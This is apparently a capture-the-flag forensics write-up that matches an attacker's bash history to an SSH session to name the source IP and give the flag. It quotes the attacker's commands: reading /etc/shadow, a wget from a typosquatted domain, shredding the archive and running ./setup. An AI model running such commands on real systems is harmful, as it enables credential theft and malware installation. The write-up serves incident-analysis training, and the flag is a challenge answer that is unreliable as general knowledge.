@@ -1,0 +1,43 @@
+Evidence chain for "An unusual sighting" — perpetrator identification
+=======================================================================
+Artifacts: files/_work/forensics_an_unusual_sighting/{sshd.log, bash_history.txt}
+SHA256:
+  bash_history.txt = 14F36EA33DE80297B88A064766ED0F8295F6D32E653D23045E7AEB537687B319
+  sshd.log         = 87D4D306B5B9BB476402836D8154CFB1E4B53214C211235EECECC1A0D5FBD117
+
+STEP 1 — The only malicious block in bash_history (attacker commands)
+---------------------------------------------------------------------
+[2024-02-19 04:00:18] whoami
+[2024-02-19 04:00:20] uname -a
+[2024-02-19 04:00:40] cat /etc/passwd
+[2024-02-19 04:01:01] cat /etc/shadow
+[2024-02-19 04:01:15] ps faux
+[2024-02-19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz
+[2024-02-19 04:10:02] tar xvf latest.tar.gz
+[2024-02-19 04:12:02] shred -zu latest.tar.gz
+[2024-02-19 04:14:02] ./setup
+(Recon of credentials /etc/shadow, download from typosquatted domain
+ gnu-packages.com impersonating gnu.org, evidence destruction via shred,
+ then executing a dropped ./setup — classic trojanised-tool supply-chain.)
+
+STEP 2 — The SSH session that covers this exact window (sshd.log)
+-----------------------------------------------------------------
+[2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain ""
+[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
+[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
+[2024-02-19 04:00:14] Starting session: shell on pts/2 for root from 2.67.182.119 port 60071 id 0
+[2024-02-19 04:38:17] Disconnected from user root 2.67.182.119 port 60071
+Session window 04:00:14 -> 04:38:17 fully contains the malicious block
+04:00:18 -> 04:14:02. No other session overlaps (verified by script).
+
+STEP 3 — Uniqueness of the suspect
+----------------------------------
+* Only 2 successful root logins exist: legit provisioning 2024-02-13 11:29:50
+  (100.81.51.199, matches the setup commands in history) and this one.
+* All other sessions are user "softdev" during working hours with commands
+  matching legit dev work (git, server.py, nvim, pip) at their own timestamps.
+* 2.67.182.119 uses its own SSH key fingerprint, odd hour (04:00), password
+  login as root, and unique public source address.
+
+CONCLUSION: perpetrator = 2.67.182.119  ->  FLAG = HTB{2.67.182.119}
+Reproduction: python solve/solve.py  (deterministic, timestamp-window based)
